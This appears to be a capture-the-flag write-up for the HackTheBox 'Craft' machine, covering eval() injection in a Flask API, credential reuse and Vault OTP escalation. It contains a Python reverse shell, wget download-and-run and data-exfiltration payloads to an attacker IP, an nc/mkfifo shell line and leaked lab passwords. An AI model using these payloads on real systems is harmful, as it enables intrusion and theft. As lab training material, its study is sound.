Craft is a medium-difficulty Linux system. To reach the `user.txt` flag, a variety of small hurdles must be overcome. The majority of this process involves getting to the bottom of what's up with the beer-themed Craft API. It seems that one of the developers had a few too many craft IPAs before pushing some sloppy changes to the Craft API Gogs repository. The steps to `user.txt` all feel very "real" and make for a great exprience. The route to the `root.txt` flag is fairly straight forward and even more obvious. Reading the relevant documentation will get you there.

## User
To start the process, a port scan was run against the target using `masscan`. The purpose of this intial scan was to quickly determine which ports are open so that a more focused `nmap` scan could be performed that targets only the open ports discovered by `masscan`.

```
root@kali:~/workspace/hackthebox/Craft# masscan -e tun0 -p 1-65535 --rate 2000 10.10.10.98
```

From `masscan`, it was revealed that TCP ports 22 (SSH), 443 (HTTPS), and 6022 were listening for connections. Using this information, a second scan was run using `nmap` to more thoughoughly examine the services listening on the discovered ports.

```

This confirms that the protocols being used on on TCP ports 22 and 443 and suggests that an additional SSH service is running on TCP port 6022. After using Google, `searchsploit`, and other resources to search for possible vulnerabilities related to the services and versions discovered by `nmap`, it was discovered that while vulnerabilities appear to exist for the SSH services running on ports 22 and 6022, the vulnerabilities do not seem particularly helpful or relevant in this case.

After running `echo "10.10.10.110 craft.htb" >> /etc/hosts` on the testing system, a web browser was opened and `https://craft.htb` was visited, revealing the page shown below.

![web_page.gif](/assets/images/htb/craft/web_page.gif)

Notice that mousing over the two links in the corner reveals the subdomains of `api.craft.htb` as well as `gogs.craft.htb`. Therefore, both subdomains were added to the `/etc/hosts` file in the same manner as shown above (`echo "10.10.10.110 api.craft.htb" >> /etc/hosts; echo "10.10.10.110 gogs.craft.htb" >> /etc/hosts`).

Following the `api.craft.htb` link directs to "Craft API" page. The page suggests that the API can be used to generate authorization tokens, check the validity of authorization tokens, and interact with "beer" using a variety of operations. Notice that the `POST` and `PUT` methods likely open the door to writing user-supplied code to the server and underlying databases.

![craft_api.png](/assets/images/htb/craft/craft_api.png)

After experimenting with the API functionality for a little while, it became apparent that a valid authorization token was required before any of the risky methods (i.e. `POST`, `PUT`, and `DELETE`) could be utilized. A valid authorization token is generated after providing a valid set of credentials at `https://api.craft.htb/api/auth/login`.

![auth.png](/assets/images/htb/craft/auth.png)

Visiting the `https://gogs.craft.htb` URL initially directs to a Gogs landing page. According to othe landing page, Gogs is "a painless self-hosted Git service". Gogs essentially works as a self-hosted, open source, version of GitHub. From the landing page, clicking the "Explore" tab directs to the page demonstrated below.

![explore_page.gif](/assets/images/htb/craft/explore_page.gif)

The page shows one private repository called `Craft/craft-api`, three users, and the `Craft` organization. Starting with the repository, it immediately stands out that there is one outstanding issue (found at `https://gogs.craft.htb/Craft/craft-api/issues/2`) with the "Craft API" file `craft_api/api/brew/endpoints/brew.py`. Within the comment section of this issue, the `dinesh` user suggests that impossible ABV values can be written to the database using a `POST` API call to `https://api.craft.htb/api/brew/`. The user includes an API authorization token in the example command (shown below), however the token is no longer valid.

```
curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImV4cCI6MTU0OTM4NTI0Mn0.-wW1aJkLQDOE-GP5pQd3z_BJTe2Uo0jJ_mQ238P5Dqw' -H "Content-Type: application/json" -k -X POST https://api.craft.htb/api/brew/ --data '{"name":"bullshit","brewer":"bullshit", "style": "bullshit", "abv": "15.0")}'
```

 The `ebachman` user suggests that `dinesh` fix the issue himself, so `dinesh` decides to push fix `c414b16057` (found at `https://gogs.craft.htb/Craft/craft-api/commit/c414b160578943acfe2e158e89409623f41da4c6`). 

![fix.png](/assets/images/htb/craft/fix.png)

The fix involves checking the value stored within the `request.json['abv']` JSON object via the Python `eval()` function. The `eval()` function is very dangerous whenever it accepts untrusted-user input! Referencing the `dinesh` user's example command, it is clear that the the `request.json['abv']` value is chosen by a user. The `gilfoyle` user hints at this problem in the final comment in the open issue thread.

>Can we remove that sorry excuse for a "patch" before something awful happens?

To leverage this, however, a valid API authorization token is needed, and therefore, a set of credentials is needed.  The `gilfoyle` user hints at this problem in the final comment in the open issue thread.

Further enumeration of the `Craft/craft-api` repository lead to the `craft_api/tests/test.py` file with the `a2d28ed155 commit` comment of "Cleanup test" from the `dinesh` user. Viewing this file suggests that it was used by `dinesh` to test the changes he made to address the impossible ABV value issue mentioned previously. It also suggests that at one point, the `test.py` file was not so "clean". In the `test.py` Python file, there is a line of code that interacts with `https://api.craft.htb/api/auth/login` URL where API authentication codes are created.

```
...
response = requests.get('https://api.craft.htb/api/auth/login',  auth=('', ''), verify=False)
...
```

Following the "History" link while viewing the `test.py` file in a browser window shows that two commits have been made.

![commit_history.png](/assets/images/htb/craft/commit_history.png)

As it turns out, the initial `10e3ba4f0a commit` is not so clean, as the empty `auth` variable referenced above contains credentials for the `dinesh` user.

```
...
response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
...
```

Additionally, with this file the `dinesh` user has created a script that can be used by an attacker to exploit the `eval()` vulnerability mentioned previously. This can be accomplished by simply replacing `brew_dict['abv']` key value of `15.0` with Python code. The original `test.py` code is shown below, as it will later be used to execute code on the target system.

```python
#!/usr/bin/env python

import requests
import json

response = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False)
json_response = json.loads(response.text)
token =  json_response['token']

headers = { 'X-Craft-API-Token': token, 'Content-Type': 'application/json'  }

# make sure token is valid
response = requests.get('https://api.craft.htb/api/auth/check', headers=headers, verify=False)
print(response.text)

# create a sample brew with bogus ABV... should fail.

print("Create bogus ABV brew")
brew_dict = {}
brew_dict['abv'] = '15.0'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)


# create a sample brew with real ABV... should succeed.
print("Create real ABV brew")
brew_dict = {}
brew_dict['abv'] = '0.15'
brew_dict['name'] = 'bullshit'
brew_dict['brewer'] = 'bullshit'
brew_dict['style'] = 'bullshit'

json_data = json.dumps(brew_dict)
response = requests.post('https://api.craft.htb/api/brew/', headers=headers, data=json_data, verify=False)
print(response.text)
```

To demonstrate the issue with untrusted- and unsanitized- user input to Python's `eval()` function, consider the following scenario. First using a Python console, a test function was a created that served to immitate the risky implementation of the `eval()` function within the `craft_api/api/brew/endpoints/brew.py` Craft API file.

```python
def test_func():
    if eval('%s > 1' % brew_dict['abv']):
        return "ABV must be a decimal value less than 1.0", 400
    else:
        return "Whatever"
```

Next (still within the Python console), the `brew_dict` dictionary and the `brew_dict['abv']` value were created. The value chosen for the `abv` key below was chosen to demonstrate how `dinesh` hoped his changes to `brew.py` would work.

```python
brew_dict = {}
brew_dict['abv'] = '15.0'
```

Running `test_func()` displays the expected results. Nothing wrong here, right?

```
>>> test_func()
('ABV must be a decimal value less than 1.0', 400)
```

Changing the value of the `brew_dict['abv']` to something more malicious, however, could result in an outcome that `dinesh` did not consider.

```python
brew_dict['abv'] = '__import__("os").system("pwd")'
```

Running `test_func()` again with the new `brew_dict['abv']` value results in the `pwd` command being executed (and the `else` condition being met).

```
>>> test_func()
/root/workspace/hackthebox/Craft
'Whatever'
```

This demonstrates code execution on the local (attacking) system. To gain remote code execution on the target system, the `test.py` file (shown previously in full above) was replicated on the local system (recall that `test.py` already contains credentials for `dinesh`). Then, line 20 of `test.py` was changed from `brew_dict['abv'] = '15.0'` to `brew_dict['abv'] = '__import__("os").system("ping -c 3 10.10.14.22")'` (note that `10.10.14.22` is the IP address of the local system on the HackTheBox network). 

In a separate terminal window on the local system, the `tcpdump -nni any icmp` command was run to display any ICMP network traffic received on any network interface. Then, the `test.py` file was run on the local system. The results of this are demonstrated below.

![ping.gif](/assets/images/htb/craft/ping.gif)

This confirms that remote code execution on the target system is possible through the `eval()` function in `brew.py`. Leveraging this to gain access to the remote system took some experimentation, as simple reverse shell payloads did not seem to work, and little feedback is returned regarding the reason (note: this is due to how the function within `brew.py` is written where the `eval()` function is implemented). 

To help understand the state of the remote system (and to potentially identify why simple reverse shell payloads were not working), the following general process was followed.

First, a simple HTTP server was created on the local system with `python3 -m http.server 80`. Then, the previously-used `ping -c 3 10.10.14.22` payload was replaced with something like `wget http://10.10.14.22/$(echo $(pwd))`. In other words, line 20 of `test.py` was changed to `brew_dict['abv'] = '__import__("os").system("wget http://10.10.14.22/$(echo $(pwd))")'`. Running `test.py` shows the following in the terminal window where the Python HTTP server is listening.

```
10.10.10.110 - - [04/Jan/2020 11:55:31] code 404, message File not found
10.10.10.110 - - [04/Jan/2020 11:55:31] "GET //opt/app HTTP/1.1" 404 -
```

This shows that the `pwd` on the remote system is `/opt/app`. Changing the `pwd` command in `test.py` to `ls` shows that this directory contains the Craft API files found in the Gogs repository.

```
10.10.10.110 - - [04/Jan/2020 11:58:58] code 404, message File not found
10.10.10.110 - - [04/Jan/2020 11:58:58] "GET /app.py HTTP/1.1" 404 -
```

Using this information it is likely that a Python file can be executed on the remote system to gain access. A Python reverse shell `shell.py` was created on the local (attacking) system.

```python
import socket,subprocess,os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.22",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

After starting a `nc` listener on the local system with `nc -lvp 4444` and with the Python HTTP server still running, the `shell.py` file was transferred to the remote target system and executed by changing the `brew_dict['abv']` payload within `test.py` to `wget http://10.10.14.22/shell.py -O shell.py && python ./shell.py`.

![caught_shell.gif](/assets/images/htb/craft/caught_shell.gif)

With a `root` shell on the remote system, it quickly becomes clear that something is a bit off. The output of `ps waux` shows that very few processes are running.

```
/opt/app # ps waux
PID   USER     TIME  COMMAND
    1 root      0:05 python ./app.py
  121 root      0:00 sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 4444 >/tmp/f
  124 root      0:00 cat /tmp/f
  125 root      0:00 /bin/sh -i
  126 root      0:00 nc 10.10.14.21 4444
  148 root      0:00 python ./shell.py
  150 root      0:00 /bin/sh -i
  153 root      0:00 ps waux
```

Also in the `/` directory of the system there is a `.dockerenv` file. This suggests that the Craft API is run within a Docker container on the remote system. While escaping the container seemed difficult in this case, the remote access to the system was valuable nonetheless, as a `settings.py` file . Going back to the contents of the Craft API repository, there is a file called `craft-api/dbtest.py`. 

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1"
        cursor.execute(sql)
        result = cursor.fetchone()
        print(result)

finally:
    connection.close()
```

Running this file from the command line of the remote system results in the following expected (uninteresting) output.

```
/opt/app # python dbtest.py
{'id': 12, 'brewer': '10 Barrel Brewing Company', 'name': 'Pub Beer', 'abv': Decimal('0.050')}
```

Still, the `dbtest.py` file is interesting for two reasons. First, from the `from craft_api import settings` line, it is clear that there is a settings file that contains the database information including a database user and password (note: it turns out that these database credentials are rather unimportant). The settings file is not accessible via the Gogs `Craft/craft-api` repository, however it is accessible from the command line of the remote system.

```python
/opt/app/craft_api # cat settings.py
# Flask settings
FLASK_SERVER_NAME = 'api.craft.htb'
FLASK_DEBUG = False  # Do not use debug mode in production

# Flask-Restplus settings
RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
RESTPLUS_VALIDATE = True
RESTPLUS_MASK_SWAGGER = False
RESTPLUS_ERROR_404_HELP = False
CRAFT_API_SECRET = 'hz66OCkDtv8G6D'

# database
MYSQL_DATABASE_USER = 'craft'
MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
MYSQL_DATABASE_DB = 'craft'
MYSQL_DATABASE_HOST = 'db'
SQLALCHEMY_TRACK_MODIFICATIONS = False
```

Secondly, the `dbtest.py` file is running a SQL query against the `brew` table which is referenced in `craft-api/craft_api/database/models.py` on Gogs. Along with the `brew` table, a `user` table is also referenced in the aforementioned file. Knowing this, the contents of `dbtest.py` can be modified to run a SQL query that will display the information from the `user` table instead of the boring information from the `brew` table.

The `dbtest.py` file was edited on the local attacking system and then transferred to the remote system using `wget http://10.10.14.22/dbtest.py -O dbtest.py` (on the remote system's CLI) and `python3 -m http.server 80` (on the local system).

The newly modified `dbtest.py` file is represented below. Note the change to the `sql` variable and to the `result` variable.

```python
#!/usr/bin/env python

import pymysql
from craft_api import settings

# test connection to mysql database

connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
                             user=settings.MYSQL_DATABASE_USER,
                             password=settings.MYSQL_DATABASE_PASSWORD,
                             db=settings.MYSQL_DATABASE_DB,
                             cursorclass=pymysql.cursors.DictCursor)

try: 
    with connection.cursor() as cursor:
        sql = "SELECT * FROM `user`"
        cursor.execute(sql)
        result = cursor.fetchmany(1000)
        print(result)

finally:
    connection.close()
```

Running the new `dbtest.py` on the remote system provides the username and password combinations for the other Gogs users.

```
/opt/app # python dbtest.py
[{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}, {'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}, {'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}]
```

Signing into Gogs as the `gilfoyle` user grants access to the user's private `craft-infra` repository that is not available to any other user. 

![gilfoyle_infra.png](/assets/images/htb/craft/gilfoyle_infra.png)

Within this repository there resides a `craft-infra/.ssh/id_rsa` private OpenSSH key. The `id_rsa` private key contents were copied to the local system. Then, the SSH service running on port 22 of the remote system was accessed as the `gilfoyle` user while specifying the path to the user's private OpenSSH key on the local system using the `-i` flag.

```
root@kali:~/workspace/hackthebox/Craft# ssh gilfoyle@craft.htb -i ./id_rsa


  .   *   ..  . *  *
*  * @()Ooc()*   o  .
    (Q@*0CG*O()  ___

   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |

   |  |  |  |  |\___/
   |\_|__|__|_/|
    \_________/



Enter passphrase for key './id_rsa': 
```

Entering the `gilfoyle` user's Gogs password as the passphrase for the private key grants access to the system. The `user.txt` flag can now be read.

```
gilfoyle@craft:~$ cat user.txt
bbf4b0ca<redacted>
```

## Root
In the `gilfoyle` user's home directory there is a `.vault-token` SSH file. Additionally, in the user's private `craft-infra` Gogs repository there is a `vault` directory. 

![vault_dir.png](/assets/images/htb/craft/vault_dir.png)

After a short bit of research, on HashiCorp's [Vault](https://www.vaultproject.io/) tool, it became apparent that Vault was being used to control access to the system. 

The `craft-infra/vault/secrets.sh` file suggests that one-time passwords (OTP) are being used to access the system as `root`. It also seems that the SSH role has not been locked down sufficiently, as the `cidr_list` value of `0.0.0.0/0` will match any IP address. The contents of `secrets.sh` are shown below.

```bash
#!/bin/bash

# set up vault secrets backend

vault secrets enable ssh

vault write ssh/roles/root_otp \
    key_type=otp \
    default_user=root \
    cidr_list=0.0.0.0/0
```

Reading the [document](https://learn.hashicorp.com/vault/secrets-management/sm-ssh-otp) provided by HashiCorp reinforces this hunch. The document outlines the steps required to configure the Vault SSH secrets engine in one-time SSH password mode. The guide includes the `vault secrets enable ssh` command as well as an example of the `vault write` command, both of which are present in the `secrets.sh` script included above.

Issuing the `vault secrets enable ssh` command on the remote system as the `gilfoyle` user hints that the commands within `secrets.sh` have already been executed.

```
gilfoyle@craft:~$ vault secrets enable ssh
Error enabling: Error making API request.

URL: POST https://vault.craft.htb:8200/v1/sys/mounts/ssh
Code: 400. Errors:

* existing mount at ssh/
```

Furthermore, the SSH secrets engine guide demonstrates the creation of a policy file (the `gilfoyle` user's Gog repository file `craft-infra/vault/config.hcl`), and the configuration of a Vault user. The Vault user first must authenticate to Vault before an OTP credential can be generated. In the guide, a user is created with the `userpass` authentication method. Authenticating to Vault with the `userpass` authentication method requires a Vault username and password. Attempting to authenticate to Vault with the `gilfoyle` user's heavily-resused Gogs credentials does not succeed.

```
gilfoyle@craft:~$ vault login -method=userpass username=gilfoyle password=ZEU3N8WNM2rh4T
Error authenticating: Error making API request.

URL: PUT https://vault.craft.htb:8200/v1/auth/userpass/login/gilfoyle
Code: 400. Errors:

* invalid username or password
```

More Google searching revealed that the `token` [authentication method](https://www.vaultproject.io/docs/auth/token.html) is an alternative authentication method to the `userpass` method. Recall the `.vault-token` in the `gilfoyle` user's `/home` directory.

```
gilfoyle@craft:~$ cat .vault-token

Authenticating to Vault with this token using the `vault login token=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9` command succeeds.

```
gilfoyle@craft:~$ vault login token=f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
Success! You are now authenticated. The token information displayed below
is already stored in the token helper. You do NOT need to run "vault login"
again. Future Vault requests will automatically use this token.

Finally, another helpful [document](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html) from HashiCorp mentions that an authenticated Vault user can use a single CLI command to request credentials from the Vault server. If authorized, the user will be issued an OTP SSH password.

Issuing the command `vault ssh -role root_otp -mode otp root@craft.htb` grants access to the system as the `root` user using a one-time SSH password provided by Vault.

From here, the `root.txt` flag can be read.

```
root@craft:~# cat root.txt
